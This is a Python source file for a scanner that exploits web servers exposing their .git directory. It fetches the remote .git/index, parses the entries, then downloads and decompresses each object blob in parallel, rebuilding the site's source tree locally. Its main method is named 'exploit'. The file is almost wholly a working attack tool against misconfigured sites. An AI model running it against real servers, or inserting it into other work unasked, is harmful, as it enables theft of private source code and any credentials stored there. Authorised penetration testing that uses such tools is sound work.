# -*- coding: utf-8 -*-
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib import parse, request
from pathlib import Path
import io
import sys
import logging

from parse import parse_index, parse_blob


class Scanner:
    def __init__(self, uri: str):
        self.workdir = Path('site')
        self.uri = self._check_uri(uri)
        print('Target:', self.uri)

    def _check_uri(self, uri):
        parsed = parse.urlparse(uri)
        self.workdir /= parsed.netloc
        if self.workdir.exists():
            option = input(f'Workdir `{self.workdir}` already exists: [o]verride/[Q]uit? ')
            option = option.strip().lower()
            if option == 'q' or option == '':
                sys.exit(1)
        else:
            self.workdir.mkdir(parents=True)
        if not parsed.path.rstrip('/').endswith('.git'):
            uri = parse.urljoin(uri, '.git')
        return uri

    def _get_index(self):
        req = request.Request(self.uri + '/index')
        res = request.urlopen(req)
        return io.BytesIO(res.read())

    def _get_blob(self, name, sha1):
        uri = '/'.join([self.uri, 'objects', sha1[:2], sha1[2:]])
        req = request.Request(uri)
        res = request.urlopen(req)
        header, blob = parse_blob(res.read())
        filename = self.workdir / name
        if not filename.parent.exists():
            filename.parent.mkdir(parents=True, exist_ok=True)
        filename.write_bytes(blob)
        return header.decode()

    def exploit(self):
        index_file = self._get_index()
        _parser = parse_index(index_file)
        total = next(_parser)
        print(f"Total: {total}")

        with ThreadPoolExecutor() as executor:
            futures = {executor.submit(self._get_blob, e.name, e.sha1): e.name for e in _parser}

        for future in as_completed(futures):
            e = futures[future]
            try:
                result = future.result()
            except Exception as exc:
                print(f'\x1b[31;1m[ERROR]\x1b[0m {e} : {repr(exc)}')
            else:
                print(f'\x1b[32m[OK]\x1b[0m {e} : {result}')
